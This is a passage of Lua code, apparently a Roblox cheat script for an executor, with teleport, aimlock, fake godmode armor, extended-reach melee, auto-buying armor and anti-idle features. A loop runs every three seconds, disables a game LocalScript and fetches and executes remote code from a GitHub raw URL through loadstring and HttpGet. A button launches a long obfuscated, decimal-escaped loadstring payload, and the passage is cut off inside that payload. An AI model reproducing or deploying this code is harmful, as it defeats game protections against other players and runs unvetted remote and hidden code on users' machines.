            bb.Visible = false
        end
        function announce(cS, cc, cd)
            game.StarterGui:SetCore("SendNotification", {Title = cS, Text = cc, Duration = cd})
        end
        b = game:GetService("Players")
        UIS = game:GetService("UserInputService")
        RS = game:GetService("RunService")
        _.MouseButton1Click:Connect(
            function()
                hideframes()
                br.Visible = true
            end
        )
        a5.MouseButton1Click:Connect(
            function()
                hideframes()
                bb.Visible = true
            end
        )
        a1.MouseButton1Click:Connect(
            function()
                hideframes()
                aG.Visible = true
            end
        )
        a3.MouseButton1Click:Connect(
            function()
                hideframes()
                aW.Visible = true
            end
        )
        aa.MouseButton1Click:Connect(
            function()
                hideframes()
                aq.Visible = true
            end
        )
        ac.MouseButton1Click:Connect(
            function()
                hideframes()
                bW.Visible = true
            end
        )
        local cT = function(cU)
            cU = tostring(cU)
            return cU:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
        end
        function SetPlayerInfo()
            local cV = game:GetService("Players"):FindFirstChild(am.Text)
            if cV then
                local cW = cV.UserId
                local cX = Enum.ThumbnailType.HeadShot
                local cY = Enum.ThumbnailSize.Size420x420
                local cZ, c_ = game:GetService("Players"):GetUserThumbnailAsync(cW, cX, cY)
                aj.Image = cZ
                al.Text = "Cash : " .. cT(cV.DataFolder.Currency.Value)
                an.Text = "Bounty : " .. cT(cV.leaderstats.Wanted.Value)
                local d0 = cV:FindFirstChild("DataFolder"):FindFirstChild("Information"):FindFirstChild("Crew")
                if d0 then
                    if d0.Value ~= nil and d0.Value ~= "" then
                        Crew = game:GetService("GroupService"):GetGroupInfoAsync(tonumber(d0.Value))
                        if Crew then
                            ao.Text = "Crew : " .. Crew.Name
                            CrewId = tonumber(d0.Value)
                        end
                    else
                        ao.Text = "Crew : None"
                        Crew = nil
                    end
                else
                    ao.Text = "Crew : None"
                    Crew = nil
                end
            end
        end
        ao.MouseButton1Click:Connect(
            function()
                if ao.Text ~= "Crew : None" then
                    setclipboard(CrewId)
                end
            end
        )
        function ShrinkName()
            am.FocusLost:connect(
                function()
                    for s, O in pairs(game.Players:GetChildren()) do
                        if string.sub(string.lower(O.Name), 1, string.len(am.Text)) == string.lower(am.Text) then
                            am.Text = O.Name
                            SetPlayerInfo()
                        end
                    end
                end
            )
        end
        ShrinkName()
        function view(Q)
            wait()
            if game.Players:FindFirstChild(Q) then
                if game.Players[Q].Character then
                    game.Workspace:FindFirstChildWhichIsA("Camera").CameraSubject =
                        game.Players:FindFirstChild(Q).Character.HumanoidRootPart
                else
                    az.Text = "View"
                end
            else
                az.Text = "View"
            end
        end
        local d1 = game:GetService("VirtualUser")
        game:GetService("Players").LocalPlayer.Idled:connect(
            function()
                d1:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                wait(1)
                d1:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            end
        )
        spawn(
            function()
                game.RunService.RenderStepped:Connect(
                    function()
                        game.Players.LocalPlayer.MaximumSimulationRadius = 1000
                        setsimulationradius(1000, 1000)
                    end
                )
            end
        )
        coroutine.resume(
            coroutine.create(
                function()
                    while wait(3) do
                        local function d2()
                            if c.Character:FindFirstChildWhichIsA("Script"):FindFirstChild("LocalScript") then
                                c.Character:FindFirstChildWhichIsA("Script"):FindFirstChild("LocalScript").Disabled =
                                    true
                            end
                            if c.Character.UpperTorso:FindFirstChild("OriginalSize") then
                                c.Character.UpperTorso:FindFirstChild("OriginalSize"):Destroy()
                            end
                            loadstring(
                                game:HttpGet("https://raw.githubusercontent.com/swagmode/swagmode/main/swagnames")
                            )()
                        end
                        local V, W = pcall(d2)
                    end
                end
            )
        )
        c = game.Players.LocalPlayer
        mouse = c:GetMouse()
        MainEvent = game:GetService("ReplicatedStorage").MainEvent
        IsMod = false
        MaxDistance = 15
        COOLDOWN = true
        RIDING = false
        Aimlocked = nil
        NamePos = CFrame.new(0, 0, 0)
        green = Color3.new(0, 255, 0)
        red = Color3.new(255, 0, 0)
        buyingarmor = false
        UIS.InputBegan:Connect(
            function(cw, d3)
                if cw.KeyCode == Enum.KeyCode.V and not d3 then
                    if Y.Visible == true then
                        Y.Visible = false
                    else
                        Y.Visible = true
                    end
                end
                if cw.KeyCode == Enum.KeyCode.Q and not d3 then
                    if bt.BackgroundColor3 == green then
                        if mouse.Target then
                            local co = mouse.Target
                            local d4 = co.Size
                            local d5 = d4.Y / 2
                            c.Character.HumanoidRootPart.CFrame =
                                CFrame.new(mouse.Hit.X, co.Position.Y + d5 + 3, mouse.Hit.Z) *
                                CFrame.Angles(
                                    math.rad(c.Character.HumanoidRootPart.Orientation.X),
                                    math.rad(c.Character.HumanoidRootPart.Orientation.Y),
                                    math.rad(c.Character.HumanoidRootPart.Orientation.Z)
                                )
                            if not c.Character.LeftHand:FindFirstChild("LeftWrist") then
                                c.Character.LeftHand.Position = c.Character.LeftLowerArm.Position
                                c.Character.RightHand.Position = c.Character.RightLowerArm.Position
                            end
                        end
                    end
                end
                if cw.KeyCode == Enum.KeyCode.LeftAlt and not d3 then
                    if buyingarmor == false and bR.BackgroundColor3 == green then
                        local d6 = 1000
                        buyingarmor = true
                        local d7 = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1000"].ClickDetector
                        local d8 =
                            game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1000"].ClickDetector.Parent.Head.Position
                        OldCFrame = c.Character.HumanoidRootPart.CFrame
                        local function d9()
                            wait()
                            c.Character.HumanoidRootPart.CFrame = CFrame.new(d8)
                            fireclickdetector(d7)
                        end
                        repeat
                            d9()
                        until c.Character.BodyEffects.Armor.Value == 100 or c.DataFolder.Currency.Value <= d6 or
                            c.Character.BodyEffects.Armor:FindFirstChild("God")
                        c.Character.HumanoidRootPart.CFrame = OldCFrame
                        buyingarmor = false
                    end
                end
                if cw.KeyCode == Enum.KeyCode.F and not d3 then
                    if bv.BackgroundColor3 == green or bL.BackgroundColor3 == green then
                        HoldingF = true
                        c.Character:FindFirstChildWhichIsA("Humanoid").Name = "SWAG ON TOP"
                        while HoldingF == true and bv.BackgroundColor3 == green do
                            wait()
                            for n, O in pairs(
                                c.Character:FindFirstChildWhichIsA("Humanoid"):GetPlayingAnimationTracks()
                            ) do
                                if O.Name == "Block" then
                                    O:Stop()
                                end
                            end
                        end
                    end
                end
                if cw.KeyCode == Enum.KeyCode.Space and not d3 then
                    coroutine.resume(
                        coroutine.create(
                            function()
                                if b4.Text == "Unstamina" then
                                    HoldingSpace = true
                                    while HoldingSpace == true do
                                        wait()
                                        c.Character:FindFirstChildWhichIsA("Humanoid").JumpPower = 50
                                        c.Character:FindFirstChildWhichIsA("Humanoid").Jump = true
                                    end
                                end
                            end
                        )
                    )
                    if RIDING == true then
                        COOLDOWN = false
                        for s, O in pairs(game.Workspace.Ignored:GetChildren()) do
                            if O.Name == "MyLauncher" then
                                O.Name = "Launcher"
                            end
                        end
                        repeat
                            wait()
                        until not game:GetService("Workspace"):FindFirstChild("Ignored"):FindFirstChild("MyLauncher")
                        COOLDOWN = true
                    end
                end
                if cw.KeyCode == Enum.KeyCode.E and not d3 then
                    if aX.Text == "Unaimlock" then
                        local da = mouse.Target.Parent:FindFirstChild("LowerTorso")
                        if not da then
                            da = mouse.Target.Parent.Parent:FindFirstChild("LowerTorso")
                        end
                        if da then
                            if da.Parent.Name == "SpecialParts" then
                                Aimlocked = da.Parent.Parent.Parent.Name
                            else
                                Aimlocked = da.Parent.Name
                            end
                            announce("Aimlocked to " .. Aimlocked, RPGTarget, 3)
                        else
                            Aimlocked = nil
                            announce("Unaimlocked", "", 2)
                        end
                    end
                end
            end
        )
        HoldingSpace = false
        UIS.InputEnded:Connect(
            function(cw, d3)
                if cw.KeyCode == Enum.KeyCode.F and not d3 then
                    c.Character:FindFirstChildWhichIsA("Humanoid").Name = "Humanoid"
                    HoldingF = false
                end
                if cw.KeyCode == Enum.KeyCode.Space then
                    HoldingSpace = false
                end
            end
        )
        c.CharacterAdded:Connect(
            function(db)
                repeat
                    wait()
                until c.Character
                NamePos = c.Character.HumanoidRootPart.CFrame
                if SpawnPosition ~= nil then
                    c.Character.HumanoidRootPart.CFrame = SpawnPosition
                end
            end
        )
        game.Workspace.Ignored.ChildAdded:Connect(
            function(dc)
                if dc.Name == "Launcher" and c.Character:FindFirstChild("[RPG]") then
                    dc.Name = "MyLauncher"
                end
            end
        )
        az.MouseButton1Click:Connect(
            function()
                if az.Text == "View" then
                    az.Text = "Unview"
                    repeat
                        view(am.Text)
                    until az.Text == "View"
                    game.Workspace:FindFirstChildWhichIsA("Camera").CameraSubject =
                        c.Character:FindFirstChildWhichIsA("Humanoid")
                else
                    az.Text = "View"
                end
            end
        )
        as.MouseButton1Click:Connect(
            function()
                if c.Character.HumanoidRootPart.Size.X == 2 and c.Character.HumanoidRootPart.Size.Y == 2 then
                    c.Character.BodyEffects.Defense:Destroy()
                    Defense = Instance.new("IntValue", c.Character.BodyEffects)
                    Defense.Name = "Defense"
                    Defense.Value = 100
                    announce("ez", "successfully godblocked", 10)
                else
                    announce("Error", "you need to be using UNBAN to use godblock", 10)
                end
            end
        )
        at.MouseButton1Click:Connect(
            function()
                c.Character.BodyEffects.Armor:Destroy()
                Armor = Instance.new("IntValue", c.Character.BodyEffects)
                Armor.Name = "Armor"
                Armor.Value = 100
                GodLabel = Instance.new("IntValue", Armor)
                GodLabel.Name = "God"
            end
        )
        aF.MouseButton1Click:Connect(
            function()
                c.Character.Head:BreakJoints()
                c.Character.Head.Position = Vector3.new(0, 99999999999999, 0)
            end
        )
        ay.MouseButton1Click:Connect(
            function()
                c.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[am.Text].Character.UpperTorso.Position)
            end
        )
        ax.MouseButton1Click:Connect(
            function()
                for s, O in pairs(game:GetService("Workspace"):GetChildren()) do
                    if O:IsA("Camera") then
                        O:Destroy()
                    end
                end
                local dd = Instance.new("Camera", game.Workspace)
                dd.Name = "Camera"
                dd.CameraType = "Custom"
                dd.CameraSubject =
                    game:GetService("Workspace").Players:FindFirstChild(c.Name):FindFirstChild("Humanoid")
                dd.HeadLocked = true
                dd.HeadScale = 1
            end
        )
        if not syn and not KRNL_LOADED then
            aE.Text = "ToolReach"
        end
        aE.MouseButton1Click:Connect(
            function()
                if aE.Text == "ToolReach" then
                    if c.Character:FindFirstChildWhichIsA("Tool") then
                        c.Character:FindFirstChildWhichIsA("Tool").Handle.Size = Vector3.new(50, 50, 50)
                        c.Character:FindFirstChildWhichIsA("Tool").Handle.Transparency = 1
                    else
                        announce("Reach Error", "you need to be holding a tool", 3)
                    end
                else
                    if aE.Text == "Reach" then
                        aE.Text = "Unreach"
                        while aE.Text == "Unreach" do
                            wait()
                            local V, W =
                                pcall(
                                function()
                                    if c.Character.BodyEffects.Attacking.Value == true then
                                        for s, O in pairs(game:GetService("Players"):GetChildren()) do
                                            if
                                                (O.Character.HumanoidRootPart.Position -
                                                    game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <=
                                                    50
                                             then
                                                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                                                    if
                                                        game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild(
                                                            "Handle"
                                                        )
                                                     then
                                                        firetouchinterest(
                                                            game.Players.LocalPlayer.Character:FindFirstChildOfClass(
                                                                "Tool"
                                                            ).Handle,
                                                            O.Character.UpperTorso,
                                                            0
                                                        )
                                                    else
                                                        firetouchinterest(
                                                            game.Players.LocalPlayer.Character["RightHand"],
                                                            O.Character.UpperTorso,
                                                            0
                                                        )
                                                        firetouchinterest(
                                                            game.Players.LocalPlayer.Character["LeftHand"],
                                                            O.Character.UpperTorso,
                                                            0
                                                        )
                                                        firetouchinterest(
                                                            game.Players.LocalPlayer.Character["RightFoot"],
                                                            O.Character.UpperTorso,
                                                            0
                                                        )
                                                        firetouchinterest(
                                                            game.Players.LocalPlayer.Character["LeftFoot"],
                                                            O.Character.UpperTorso,
                                                            0
                                                        )
                                                        firetouchinterest(
                                                            game.Players.LocalPlayer.Character["RightLowerLeg"],
                                                            O.Character.UpperTorso,
                                                            0
                                                        )
                                                        firetouchinterest(
                                                            game.Players.LocalPlayer.Character["LeftLowerLeg"],
                                                            O.Character.UpperTorso,
                                                            0
                                                        )
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            )
                        end
                    else
                        aE.Text = "Reach"
                    end
                end
            end
        )
        ar.MouseButton1Click:Connect(
            function()
                for s, O in next, workspace:GetDescendants() do
                    if O:IsA "Seat" then
                        O:Destroy()
                    end
                end
                local de = false
                pcall(
                    function()
                        c.Character.LeftHand.LeftWrist:Destroy()
                        c.Character.RightHand.RightWrist:Destroy()
                    end
                )
                local df = function()
                    c.Character.LeftHand.CFrame = CFrame.new(mouse.Hit.p)
                    c.Character.RightHand.CFrame = CFrame.new(mouse.Hit.p)
                end
                local dg
                local dh = function()
                    dg = game:GetService("RunService").Heartbeat:Connect(df)
                end
                local di = function()
                    dg:Disconnect()
                end
                UIS.InputBegan:Connect(
                    function(dj, d3)
                        if dj.KeyCode == Enum.KeyCode.T and not d3 then
                            if de == false then
                                de = true
                                dh()
                            elseif de == true then
                                de = false
                                di()
                                c.Character.LeftHand.CFrame = c.Character.LeftLowerArm.CFrame
                                c.Character.RightHand.CFrame = c.Character.RightLowerArm.CFrame
                            end
                        end
                    end
                )
            end
        )
        aA.MouseButton1Click:Connect(
            function()
                if aA.Text == "Target" then
                    aA.Text = "Untarget"
                    pcall(
                        function()
                            c.Character.LeftHand.LeftWrist:Destroy()
                            c.Character.RightHand.RightWrist:Destroy()
                        end
                    )
                    local df = function()
                        if game.Players:FindFirstChild(am.Text).Character then
                            c.Character.LeftHand.CFrame =
                                CFrame.new(game.Players[am.Text].Character.UpperTorso.Position)
                            c.Character.RightHand.CFrame =
                                CFrame.new(game.Players[am.Text].Character.UpperTorso.Position)
                            if game.Players:FindFirstChild(am.Text).Character.BodyEffects["K.O"].Value == true then
                                aA.Text = "Target"
                            end
                        else
                            aA.Text = "Target"
                        end
                    end
                    local dg
                    local dh = function()
                        dg = game:GetService("RunService").Heartbeat:Connect(df)
                    end
                    local di = function()
                        dg:Disconnect()
                        announce("Target", "no longer targeting", 5)
                        c.Character.LeftHand.CFrame = c.Character.LeftLowerArm.CFrame
                        c.Character.RightHand.CFrame = c.Character.RightLowerArm.CFrame
                    end
                    dh()
                    repeat
                        wait()
                    until aA.Text == "Target"
                    di()
                else
                    aA.Text = "Target"
                end
            end
        )
        aC.MouseButton1Click:Connect(
            function()
                loadstring(
                    "\102\117\110\99\116\105\111\110\32\73\108\108\73\108\108\108\73\108\108\73\108\108\108\73\108\108\108\73\108\108\108\73\108\108\40\73\108\108\73\108\108\108\73\108\108\73\108\108\73\108\108\41\32\105\102\32\40\73\108\108\73\108\108\108\73\108\108\73\108\108\73\108\108\61\61\40\40\40\40\40\57\49\57\32\43\32\54\51\54\41\45\54\51\54\41\42\51\49\52\55\41\47\51\49\52\55\41\43\57\49\57\41\41\32\116\104\101\110\32\114\101\116\117\114\110\32\110\111\116\32\116\114\117\101\32\101\110\100\32\105\102\32\40\73\108\108\73\108\108\108\73\108\108\73\108\108\73\108\108\61\61\40\40\40\40\40\57\54\56\32\43\32\54\55\48\41\45\54\55\48\41\42\51\51\49\53\41\47\51\51\49\53\41\43\57\54\56\41\41\32\116\104\101\110\32\114\101\116\117\114\110\32\110\111\116\32\102\97\108\115\101\32\101\110\100\32\101\110\100\59\32\108\111\99\97\108\32\73\73\108\108\108\108\73\73\108\108\108\108\32\61\32\40\55\42\51\45\57\47\57\43\51\42\50\47\48\43\51\42\51\41\59\108\111\99\97\108\32\73\73\108\108\108\73\73\108\108\108\73\73\108\108\108\73\73\108\108\108\73\73\32\61\32\40\51\42\52\45\55\47\55\43\54\42\52\47\51\43\57\42\57\41\59\108\111\99\97\108\32\73\108\108\73\73\73\108\108\73\73\73\73\108\108\73\32\61\32\116\97\98\108\101\46\99\111\110\99\97\116\59\102\117\110\99\116\105\111\110\32\73\108\108\73\73\73\73\108\108\73\73\73\73\73\108\40\73\73\108\108\108\108\73\73\108\108\108\108\41\32\102\117\110\99\116\105\111\110\32\73\73\108\108\108\108\73\73\108\108\108\108\40\73\73\108\108\108\108\73\73\108\108\108\108\41\32\102\117\110\99\116\105\111\110\32\73\73\108\108\108\108\73\73\108\108\108\108\40\73\108\108\73\108\108\73\108\108\73\108\108\73\41\32\101\110\100\32\101\110\100\32\101\110\100\59\73\108\108\73\73\73\73\108\108\73\73\73\73\73\108\40\57\48\48\50\56\51\41\59\102\117\110\99\116\105\111\110\32\73\108\108\73\108\108\108\73\108\108\73\108\108\108\73\108\108\108\73\108\108\108\73\108\108\73\108\108\108\73\73\73\108\108\108\40\73\73\108\108\108\73\73\108\108\108\73\73\108\108\108\73\73\108\108\108\73\73\41\32\102\117\110\99\116\105\111\110\32\73\73\108\108\108\108\73\73\108\108\108\108\40\73\108\108\73\108\108\73\108\108\73\108\108\73\41\32\108\111\99\97\108\32\73\73\108\108\108\73\73\108\108\108\73\73\108\108\108\73\73\108\108\108\73\73\32\61\32\40\57\42\48\45\55\47\53\43\51\42\49\47\51\43\56\42\50\41\32\101\110\100\32\101\110\100\59\73\108\108\73\108\108\108\73\108\108\73\108\108\108\73\108\108\108\73\108\108\108\73\108\108\73\108\108\108\73\73\73\108\108\108\40\57\48\56\51\41\59\108\111\99\97\108\32\73\108\108\73\73\108\108\73\73\108\108\73\73\73\32\61\32\108\111\97\100\115\116\114\105\110\103\59\108\111\99\97\108\32\73\108\73\108\73\108\73\108\73\108\73\108\73\108\73\108\73\73\32\61\32\123\39\92\52\53\39\44\39\92\52\53\39\44\39\92\52\55\39\44\39\92\52\55\39\44\39\92\51\50\39\44\39\92\54\56\39\44\39\92\49\48\49\39\44\39\92\57\57\39\44\39\92\49\49\49\39\44\39\92\49\48\57\39\44\39\92\49\49\50\39\44\39\92\49\48\53\39\44\39\92\49\48\56\39\44\39\92\49\48\49\39\44\39\92\49\48\48\39\44\39\92\51\50\39\44\39\92\54\55\39\44\39\92\49\49\49\39\44\39\92\49\48\48\39\44\39\92\49\48\49\39\44\39\92\52\54\39\44\39\92\51\50\39\44\39\92\49\48\39\44\39\92\49\48\56\39\44\39\92\49\49\49\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\51\50\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\48\51\39\44\39\92\57\55\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\53\56\39\44\39\92\55\49\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\53\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\52\54\39\44\39\92\55\54\39\44\39\92\49\49\49\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\56\39\44\39\92\49\49\49\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\51\50\39\44\39\92\55\55\39\44\39\92\49\49\49\39\44\39\92\49\49\55\39\44\39\92\49\49\53\39\44\39\92\49\48\49\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\53\56\39\44\39\92\55\49\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\55\55\39\44\39\92\49\49\49\39\44\39\92\49\49\55\39\44\39\92\49\49\53\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\56\39\44\39\92\49\49\49\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\51\50\39\44\39\92\56\51\39\44\39\92\49\49\50\39\44\39\92\49\48\49\39\44\39\92\49\48\49\39\44\39\92\49\48\48\39\44\39\92\55\49\39\44\39\92\49\48\56\39\44\39\92\49\48\53\39\44\39\92\49\49\54\39\44\39\92\57\57\39\44\39\92\49\48\52\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\48\50\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\49\49\53\39\44\39\92\49\48\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\56\39\44\39\92\49\49\49\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\51\50\39\44\39\92\56\51\39\44\39\92\49\49\50\39\44\39\92\49\48\49\39\44\39\92\49\48\49\39\44\39\92\49\48\48\39\44\39\92\52\57\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\49\48\50\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\49\49\53\39\44\39\92\49\48\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\56\39\44\39\92\49\49\49\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\51\50\39\44\39\92\56\55\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\49\48\56\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\52\54\39\44\39\92\54\54\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\48\55\39\44\39\92\49\49\50\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\48\55\39\44\39\92\53\56\39\44\39\92\55\48\39\44\39\92\49\48\53\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\55\48\39\44\39\92\49\48\53\39\44\39\92\49\49\52\39\44\39\92\49\49\53\39\44\39\92\49\49\54\39\44\39\92\54\55\39\44\39\92\49\48\52\39\44\39\92\49\48\53\39\44\39\92\49\48\56\39\44\39\92\49\48\48\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\56\55\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\49\48\56\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\56\39\44\39\92\49\49\49\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\51\50\39\44\39\92\56\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\49\56\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\53\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\51\50\39\44\39\92\54\49\39\44\39\92\51\50\39\44\39\92\55\51\39\44\39\92\49\49\48\39\44\39\92\49\49\53\39\44\39\92\49\49\54\39\44\39\92\57\55\39\44\39\92\49\49\48\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\52\54\39\44\39\92\49\49\48\39\44\39\92\49\48\49\39\44\39\92\49\49\57\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\50\39\44\39\92\49\49\55\39\44\39\92\49\49\48\39\44\39\92\57\57\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\51\50\39\44\39\92\49\49\53\39\44\39\92\49\49\54\39\44\39\92\49\49\49\39\44\39\92\49\49\50\39\44\39\92\56\52\39\44\39\92\49\49\52\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\48\55\39\44\39\92\49\49\53\39\44\39\92\52\48\39\44\39\92\52\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\50\39\44\39\92\49\49\49\39\44\39\92\49\49\52\39\44\39\92\51\50\39\44\39\92\57\53\39\44\39\92\52\52\39\44\39\92\51\50\39\44\39\92\49\49\56\39\44\39\92\51\50\39\44\39\92\49\48\53\39\44\39\92\49\49\48\39\44\39\92\51\50\39\44\39\92\49\49\48\39\44\39\92\49\48\49\39\44\39\92\49\50\48\39\44\39\92\49\49\54\39\44\39\92\52\52\39\44\39\92\51\50\39\44\39\92\49\48\51\39\44\39\92\57\55\39\44\39\92\49\48\57\39\44\39\92\49\48\49\39\44\39\92\53\56\39\44\39\92\55\49\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\56\51\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\56\39\44\39\92\49\48\53\39\44\39\92\57\57\39\44\39\92\49\48\49\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\49\49\53\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\52\54\39\44\39\92\55\54\39\44\39\92\49\49\49\39\44\39\92\57\57\39\44\39\92\57\55\39\44\39\92\49\48\56\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\52\54\39\44\39\92\54\55\39\44\39\92\49\48\52\39\44\39\92\57\55\39\44\39\92\49\49\52\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\49\54\39\44\39\92\49\48\49\39\44\39\92\49\49\52\39\44\39\92\53\56\39\44\39\92\55\48\39\44\39\92\49\48\53\39\44\39\92\49\49\48\39\44\39\92\49\48\48\39\44\39\92\55\48\39\44\39\92\49\48\53\39\44\39\92\49\49\52\39\44\39\92\49\49\53\39\44\39\92\49\49\54\39\44\39\92\54\55\39\44\39\92\49\48\52\39\44\39\92\49\48\53\39\44\39\92\49\48\56\39\44\39\92\49\48\48\39\44\39\92\55\57\39\44\39\92\49\48\50\39\44\39\92\54\55\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\49\53\39\44\39\92\49\49\53\39\44\39\92\52\48\39\44\39\92\51\52\39\44\39\92\55\50\39\44\39\92\49\49\55\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\48\39\44\39\92\49\49\49\39\44\39\92\49\48\53\39\44\39\92\49\48\48\39\44\39\92\51\52\39\44\39\92\52\49\39\44\39\92\53\56\39\44\39\92\55\49\39\44\39\92\49\48\49\39\44\39\92\49\49\54\39\44\39\92\56\48\39\44\39\92\49\48\56\39\44\39\92\57\55\39\44\39\92\49\50\49\39\44\39\92\49\48\53\39\44\39\92\49\49\48\39\44\39\92\49\48\51\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\56\52\39\44\39\92\49\49\52\39\44\39\92\57\55\39\44\39\92\57\57\39\44\39\92\49\48\55\39\44\39\92\49\49\53\39\44\39\92\52\48\39\44\39\92\52\49\39\44\39\92\51\50\39\44\39\92\49\48\48\39\44\39\92\49\49\49\39\44\39\92\49\48\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\57\39\44\39\92\49\48\53\39\44\39\92\49\48\50\39\44\39\92\51\50\39\44\39\92\52\48\39\44\39\92\49\49\56\39\44\39\92\52\54\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\44\39\92\49\49\48\39\44\39\92\52\54\39\44\39\92\54\53\39\44\39\92\49\49\48\39\44\39\92\49\48\53\39\44\39\92\49\48\57\39\44\39\92\57\55\39\44\39\92\49\49\54\39\44\39\92\49\48\53\39\44\39\92\49\49\49\39\